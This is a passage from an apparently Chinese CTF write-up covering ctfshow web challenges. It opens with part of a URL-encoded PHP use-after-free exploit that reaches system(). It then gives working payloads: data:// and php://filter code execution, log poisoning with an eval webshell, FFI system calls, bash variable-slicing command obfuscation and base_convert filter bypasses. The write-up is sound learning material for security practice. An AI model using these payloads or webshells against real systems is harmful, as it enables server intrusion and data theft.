0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2B%20%24i%20*%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7B%0A%20%20%20%20%20%20%20%20%24base%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%24start%20%3D%20%24binary_leak%20%26%200xfffffffffffff000%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x1000%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3D%20%24start%20-%200x1000%20*%20%24i%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24addr%2C%200%2C%207)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3D%3D%200x10102464c457f)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_system(%24basic_funcs)%20%7B%0A%20%20%20%20%20%20%20%20%24addr%20%3D%20%24basic_funcs%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3D%20leak(%24addr)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3D%20leak(%24f_entry%2C%200%2C%206)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3D%3D%200x6d6574737973)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2B%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2B%3D%200x20%3B%0A%20%20%20%20%20%20%20%20%7D%20while(%24f_entry%20!%3D%200)%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20trigger_uaf(%24arg)%20%7B%0A%0A%20%20%20%20%20%20%20%20%24arg%20%3D%20str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;)%3B%0A%20%20%20%20%20%20%20%20%24vuln%20%3D%20new%20Vuln()%3B%0A%20%20%20%20%20%20%20%20%24vuln-%3Ea%20%3D%20%24arg%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(stristr(PHP_OS%2C%20&#x27;WIN&#x27;))%20%7B%0A%20%20%20%20%20%20%20%20die(&#x27;This%20PoC%20is%20for%20*nix%20systems%20only.&#x27;)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24n_alloc%20%3D%2010%3B%20%0A%20%20%20%20%24contiguous%20%3D%20%5B%5D%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n_alloc%3B%20%24i%2B%2B)%0A%20%20%20%20%20%20%20%20%24contiguous%5B%5D%20%3D%20str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;)%3B%0A%0A%20%20%20%20trigger_uaf(&#x27;x&#x27;)%3B%0A%20%20%20%20%24abc%20%3D%20%24backtrace%5B1%5D%5B&#x27;args&#x27;%5D%5B0%5D%3B%0A%0A%20%20%20%20%24helper%20%3D%20new%20Helper%3B%0A%20%20%20%20%24helper-%3Eb%20%3D%20function%20(%24x)%20%7B%20%7D%3B%0A%0A%20%20%20%20if(strlen(%24abc)%20%3D%3D%2079%20%7C%7C%20strlen(%24abc)%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20die(%22UAF%20failed%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24closure_handlers%20%3D%20str2ptr(%24abc%2C%200)%3B%0A%20%20%20%20%24php_heap%20%3D%20str2ptr(%24abc%2C%200x58)%3B%0A%20%20%20%20%24abc_addr%20%3D%20%24php_heap%20-%200xc8%3B%0A%0A%20%20%20%20write(%24abc%2C%200x60%2C%202)%3B%0A%20%20%20%20write(%24abc%2C%200x70%2C%206)%3B%0A%0A%20%20%20%20write(%24abc%2C%200x10%2C%20%24abc_addr%20%2B%200x60)%3B%0A%20%20%20%20write(%24abc%2C%200x18%2C%200xa)%3B%0A%0A%20%20%20%20%24closure_obj%20%3D%20str2ptr(%24abc%2C%200x20)%3B%0A%0A%20%20%20%20%24binary_leak%20%3D%20leak(%24closure_handlers%2C%208)%3B%0A%20%20%20%20if(!(%24base%20%3D%20get_binary_base(%24binary_leak)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20parse%20ELF%20header%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24basic_funcs%20%3D%20get_basic_funcs(%24base%2C%20%24elf)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20get%20zif_system%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20%24fake_obj_offset%20%3D%200xd0%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x110%3B%20%24i%20%2B%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%20%24fake_obj_offset%20%2B%20%24i%2C%20leak(%24closure_obj%2C%20%24i))%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20write(%24abc%2C%200x20%2C%20%24abc_addr%20%2B%20%24fake_obj_offset)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x38%2C%201%2C%204)%3B%20%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x68%2C%20%24zif_system)%3B%20%0A%0A%20%20%20%20(%24helper-%3Eb)(%24cmd)%3B%0A%20%20%20%20exit()%3B%0A%7D%0A%0Actfshow(%22cat%20%2Fflag0.txt%22)%3Bob_end_flush()%3B%0A%3F%3E%0A</span><br></pre></td></tr></table></figure>

<p>实在是太高端了。</p>
<h1 id="Web73"><a href="#Web73" class="headerlink" title="Web73"></a>Web73</h1><p>和71是一样的，直接查看目录然后include就行了。</p>
<h1 id="Web74"><a href="#Web74" class="headerlink" title="Web74"></a>Web74</h1><p>限制了不能使用scandir，所以就只能使用72题的方法区读取目录，然后再使用include去读取。</p>
<h1 id="Web75"><a href="#Web75" class="headerlink" title="Web75"></a>Web75</h1><p>首先就是查文件，这个及时还和上边的一样的方法</p>
<p>数据库名字需要利用前面的web58去找</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">poc：</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	<span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">	<span class="comment"># 在MySQL中,load_file(完整路径)函数读取一个文件并将其内容作为字符串返回。</span></span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$dbh</span> = <span class="literal">null</span>;</span><br><span class="line">&#125;<span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();<span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p><strong>通过 php PDO 连接数据库，通过数据库的函数间接查询文件内容</strong>，这题其实不用try也行</p>
<h1 id="Web76"><a href="#Web76" class="headerlink" title="Web76"></a>Web76</h1><p>和上题一模一样的做法即可</p>
<h1 id="Web77"><a href="#Web77" class="headerlink" title="Web77"></a>Web77</h1><p>这题要用到什么FFI，没学过的东西，只能现学了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);<span class="comment">//创建一个system对象</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="comment">//没有回显，所以将内容输出到1.txt</span></span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);<span class="comment">//通过$ffi去调用system函数</span></span><br></pre></td></tr></table></figure>

<p>采用c语言去读取就行，而且注意直接读取是没用的，执行readflag即可</p>
<h1 id="Web118"><a href="#Web118" class="headerlink" title="Web118"></a>Web118</h1><p>这题需要使用环境变量去写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//利用系统变量构造nl命令</span><br><span class="line">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$IFS????.???</span><br><span class="line"></span><br><span class="line">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;是nl</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$&#123;PATH:~M&#125;$&#123;PWD:~J&#125; ????.???</span><br></pre></td></tr></table></figure>

<p>这样就得到了flag</p>
<p>还有别的利用${PATH}构造的payload</p>
<blockquote>
<p>SHLVL是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时${SHLVL}&#x3D;1，然后在此shell中再打开一个shell时${SHLVL}&#x3D;2。<br>${PWD:$是0，${SHLVL}为1<br>$来替代数字，截取想要的字符串</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#$&#123;RANDOM&#125;是随机数，$&#123;#RANDOM&#125;一般是5，也可能是4</span><br><span class="line">$&#123;PATH:$&#123;#HOME&#125;:$&#123;#SHLVL&#125;&#125;$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125; ?$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125;??.???</span><br><span class="line"></span><br><span class="line">#其他师傅</span><br><span class="line">$&#123;PATH:~A&#125;$&#123;PATH:$&#123;#TERM&#125;:$&#123;SHLVL:~A&#125;&#125; ????.???</span><br></pre></td></tr></table></figure>

<h1 id="Web119"><a href="#Web119" class="headerlink" title="Web119"></a>Web119</h1><p>这次禁用了<code>$&#123;PATH</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.???</span><br><span class="line"># pwd=/var/www/html</span><br><span class="line"># USER=www-data</span><br><span class="line"># payload即为 /???/?at ????.???</span><br><span class="line">为了构造/bin/cat </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">也可以只要a进行构造</span><br><span class="line">$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span><br><span class="line">/???/?a? ????.???</span><br></pre></td></tr></table></figure>

<h1 id="Web120"><a href="#Web120" class="headerlink" title="Web120"></a>Web120</h1><p>和上题一样的做法即可</p>
<h1 id="Web121"><a href="#Web121" class="headerlink" title="Web121"></a>Web121</h1><p>是只能使用pwd了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;?&#125;=0，$&#123;#?&#125;=1($?是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误)</span><br><span class="line"></span><br><span class="line">$&#123;#IFS&#125;=3</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code=$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;#?&#125;&#125;?? ????.???</span><br><span class="line"></span><br><span class="line">/???/r?? ????.???</span><br><span class="line">/bin/rev</span><br></pre></td></tr></table></figure>

<h1 id="Web122"><a href="#Web122" class="headerlink" title="Web122"></a>Web122</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload：</span><br><span class="line">&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$?表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误</span><br><span class="line"></span><br><span class="line">为什么有 &lt;A</span><br><span class="line"></span><br><span class="line">&lt;A返回的错误值 使得$?为1</span><br><span class="line"></span><br><span class="line">然后再使用random去随机，多点几次就有可以得到源码的</span><br></pre></td></tr></table></figure>

<h1 id="Web124"><a href="#Web124" class="headerlink" title="Web124"></a>Web124</h1><p>讲下主要函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base_convert  		#在任意进制之间转换数字。</span><br><span class="line">hexdec 			 #把十六进制转换为十进制。</span><br><span class="line">dechex 			#把十进制转换为十六进制。</span><br><span class="line">hex2bin  		#把十六进制的字符串转换为ASCII码</span><br></pre></td></tr></table></figure>

<p>构造$_GET 把参数逃逸出去</p>
<p>转成10进制 多转一层绕过过滤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">// 把 hex2bin转化为10进制</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base_convert</span>(<span class="string">&quot;hex2bin&quot;</span>, <span class="number">36</span>, <span class="number">16</span>);   <span class="comment">//37907361743</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base_convert</span>(<span class="string">&quot;8d3746fcf&quot;</span>, <span class="number">16</span>, <span class="number">36</span>);  <span class="comment">//hex2bin</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//把_GET 先转为16进制再转为10进制</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;_GET&quot;</span>));  <span class="comment">//1598506324</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base_convert</span>(<span class="string">&quot;8d3746fcf&quot;</span>, <span class="number">16</span>, <span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="string">&quot;1598506324&quot;</span>));  <span class="comment">// 绕过过滤拿到 &quot;_GET&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>题解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;acos&#125;)&amp;abs=system&amp;acos=cat%20flag.php</span><br><span class="line"></span><br><span class="line">$$pi&#123;abs&#125;($$pi&#123;acos&#125;)  #相当于 $_GET[&#x27;abs&#x27;]($_GET[&#x27;acos&#x27;])</span><br></pre></td></tr></table></figure>

<h1 id="Web78"><a href="#Web78" class="headerlink" title="Web78"></a>Web78</h1><p>直接用base64去读取就可以了</p>
<h1 id="Web79"><a href="#Web79" class="headerlink" title="Web79"></a>Web79</h1><p>这题发现php被替换掉了，我们就可以使用data协议即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span></span><br><span class="line">PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===&gt; <span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h1 id="Web80"><a href="#Web80" class="headerlink" title="Web80"></a>Web80</h1><p>这题把data协议也禁掉了</p>
<p>这就得使用文件日志包含去解决了</p>
<p>data被替换<br>日志文件地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>

<p>User-Agent插入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>

<p>然后用蚁剑去连接就能拿到flag了。</p>
<h1 id="Web81"><a href="#Web81" class="headerlink" title="Web81"></a>Web81</h1><p>还是可以使用上面一题的文件日志包含去完成</p>
<h1 id="Web82-Web86"><a href="#Web82-Web86" class="headerlink" title="Web82-Web86"></a>Web82-Web86</h1><p>session文件包含，但是因为需要竞争的环境，得半夜才有，所以就先放放，理解知识点才是主要</p>
<h1 id="Web87"><a href="#Web87" class="headerlink" title="Web87"></a>Web87</h1><p>die死亡绕过，比较简单的一个知识点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/write=convert.base64-decode/resource=2.php</span><br></pre></td></tr></table></figure>

<p>不过要注意的点是这里需要进行两次url加密，并且是全字母加密</p>
<h1 id="Web88"><a href="#Web88" class="headerlink" title="Web88"></a>Web88</h1><p>和79题一样，用data协议即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span></span><br><span class="line">PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===&gt; <span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h1 id="Web116"><a href="#Web116" class="headerlink" title="Web116"></a>Web116</h1><p>这题需要结合misc的知识点去做，我们去对视频进行分析找到源码，然后就很容易得写出这题</p>
<h1 id="Web117"><a href="#Web117" class="headerlink" title="Web117"></a>Web117</h1><p><strong>解答</strong>：两个参数，有过滤，有die。<br>string字符串过滤器被过滤了，base64也被过滤了，但还有convert.iconv.</p>
<p>把<a href="https://so.csdn.net/so/search?q=%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC&spm=1001.2101.3001.7020">一句话木马</a>从<code>UCS-2LE</code>编码转换为<code>UCS-2BE</code>编码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>, <span class="string">&#x27;&lt;?php @eval($_POST[jz]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;payload:&quot;</span>.<span class="variable">$result</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#?&lt;hp pe@av(l_$OPTSj[]z;)&gt;?</span></span><br></pre></td></tr></table></figure>

<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;jiuzhen.php<br>post：contents&#x3D;?&lt;hp pe@av(l_$OPTSj[]z;)&gt;?</p>
<p>蚁剑连接，或者直接访问jiuzhen.php，post传参。</p>
<h1 id="Web89"><a href="#Web89" class="headerlink" title="Web89"></a>Web89</h1><p>直接数组绕过即可</p>
<h1 id="Web90"><a href="#Web90" class="headerlink" title="Web90"></a>Web90</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://804aeafe-d39e-4a16-a21d-0daec7483e63.challenge.ctf.show/?num=4476a</span><br></pre></td></tr></table></figure>

<p>直接多加一个字母即可</p>
<h1 id="Web91"><a href="#Web91" class="headerlink" title="Web91"></a>Web91</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">i </span><br><span class="line">不区分(ignore)大小写</span><br><span class="line"></span><br><span class="line">m</span><br><span class="line">多(more)行匹配</span><br><span class="line">若存在换行\n并且有开始^或结束$符的情况下，</span><br><span class="line">将以换行为分隔符，逐行进行匹配</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;abc\nabc&quot;</span>;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&quot;/^abc$/m&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span>, <span class="variable">$str</span>,<span class="variable">$matchs</span>);</span><br><span class="line">这样其实是符合正则表达式的，因为匹配的时候 先是匹配换行符前面的，接着匹配换行符后面的，两个都是abc所以可以通过正则表达式。</span><br><span class="line"></span><br><span class="line">s</span><br><span class="line">特殊字符圆点 . 中包含换行符</span><br><span class="line">默认的圆点 . 是匹配除换行符 \n 之外的任何单字符，加上s之后, .包含换行符</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;abggab\nacbs&quot;</span>;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&quot;/b./s&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$preg</span>, <span class="variable">$str</span>,<span class="variable">$matchs</span>);</span><br><span class="line">这样匹配到的有三个 bg b\n bs</span><br><span class="line"></span><br><span class="line">A</span><br><span class="line">强制从目标字符串开头匹配;</span><br><span class="line"></span><br><span class="line">D</span><br><span class="line">如果使用$限制结尾字符,则不允许结尾有换行; </span><br><span class="line"></span><br><span class="line">e</span><br><span class="line">配合函数<span class="title function_ invoke__">preg_replace</span>()使用, 可以把匹配来的字符串当作正则表达式执行; </span><br></pre></td></tr></table></figure>

<p>直接%0a绕过即可</p>
<h1 id="Web92"><a href="#Web92" class="headerlink" title="Web92"></a>Web92</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476我们就可以构造 4476e123</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload：?num=0x117c</span><br><span class="line"></span><br><span class="line">这里我采用的是16进制绕过</span><br><span class="line"></span><br><span class="line">进制绕过</span><br></pre></td></tr></table></figure>

<h1 id="Web93"><a href="#Web93" class="headerlink" title="Web93"></a>Web93</h1><p>可以使用别的进制即可，不过千万要注意进制的前缀，不然就会默认当成十进制去运算了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.0B 表示二进制的前缀</span><br><span class="line">2.0O 表示八进制的前缀 也可以使用0表示八进制的前缀</span><br><span class="line">4.0x 这个是十六进制的前缀 0x是16进制的前缀，H是16进制的后缀</span><br></pre></td></tr></table></figure>

<h1 id="Web94"><a href="#Web94" class="headerlink" title="Web94"></a>Web94</h1><p>过滤了第一个数字为0的情况，所以就无法使用八进制去绕过了，但是我们可以使用小数即可。</p>
<h1 id="Web95"><a href="#Web95" class="headerlink" title="Web95"></a>Web95</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可以通过8进制绕过但是前面必须多加一个字节（加号空格都行） ?num=+010574或者?num=%2b010574</span><br></pre></td></tr></table></figure>

<h1 id="Web96"><a href="#Web96" class="headerlink" title="Web96"></a>Web96</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./flag.php   ./当前目录</span><br><span class="line">/var/www/html/flag.php</span><br><span class="line">php://filter/resource=flag.php</span><br></pre></td></tr></table></figure>

<h1 id="Web97"><a href="#Web97" class="headerlink" title="Web97"></a>Web97</h1><p>md5数组绕过即可，或者md5强弱碰撞都行</p>
<h1 id="Web98"><a href="#Web98" class="headerlink" title="Web98"></a>Web98</h1><p>既然get传入的值会被定位指向到post所对应的值，那么只需要有get存在即可，同时post传入HTTP_FLAG&#x3D;flag就可以了</p>
<h1 id="Web99"><a href="#Web99" class="headerlink" title="Web99"></a>Web99</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();<span class="comment">//设置为数组</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));<span class="comment">//向数组里面插入随机数</span></span><br><span class="line">&#125; i</span><br><span class="line"><span class="title function_ invoke__">f</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line"><span class="comment">//in_array()函数有漏洞 没有设置第三个参数 就可以形成自动转换eg:n=1.php自动转换为1</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line"><span class="comment">//写入1.php文件 内容是&lt;?php system($_POST[1]);?&gt;</span></span><br><span class="line">&#125; ?</span><br><span class="line">&gt;</span><br><span class="line">payload: get : ?n=<span class="number">1</span>.php post:content=</span><br></pre></td></tr></table></figure>

<p>很简单的一道题目</p>
<h1 id="Web100"><a href="#Web100" class="headerlink" title="Web100"></a>Web100</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="title function_ invoke__">var_dump</span>(<span class="variable">$ctfshow</span>)&amp;v3=;</span><br><span class="line">v1=<span class="number">1</span>&amp;v2=<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat ctfshow.php&quot;</span>)<span class="comment">/*&amp;v3=*/</span>;</span><br><span class="line">?v1=<span class="number">21</span>&amp;v2=<span class="title function_ invoke__">var_dump</span>(<span class="variable">$ctfshow</span>)<span class="comment">/*&amp;v3=*/</span>;</span><br></pre></td></tr></table></figure>

<h1 id="Web101"><a href="#Web101" class="headerlink" title="Web101"></a>Web101</h1><p>这里需要用到php反射类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure>

<h1 id="Web102"><a href="#Web102" class="headerlink" title="Web102"></a>Web102</h1><p>利用base64，同时配合伪协议去写入，但是需要保证通过is_number函数的判断，可以有字母啊，但是必得是e啊，也就是科学计数法啊，来自同一家的payload啊：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=&#x27;&lt;?=`cat *`;&#x27;;</span><br><span class="line">$b=base64_encode($a);  // PD89YGNhdCAqYDs=</span><br><span class="line">$c=bin2hex($b);      //这里直接用去掉=的base64</span><br><span class="line">输出   5044383959474e6864434171594473</span><br><span class="line"></span><br><span class="line">带e的话会被认为是科学计数法，可以通过is_numeric检测。</span><br><span class="line">大家可以尝试下去掉=和带着=的base64解码出来的内容是相同的。因为等号在base64中只是起到填充的作用，不影响具体的数据内容。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php</span><br></pre></td></tr></table></figure>

<p>post：v1&#x3D;hex2bin</p>
<p>然后访问1.php去触发就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注意区别bin2hex和hex2bin</span><br></pre></td></tr></table></figure>

<h1 id="Web103"><a href="#Web103" class="headerlink" title="Web103"></a>Web103</h1><p>和上题一样的做法即可</p>
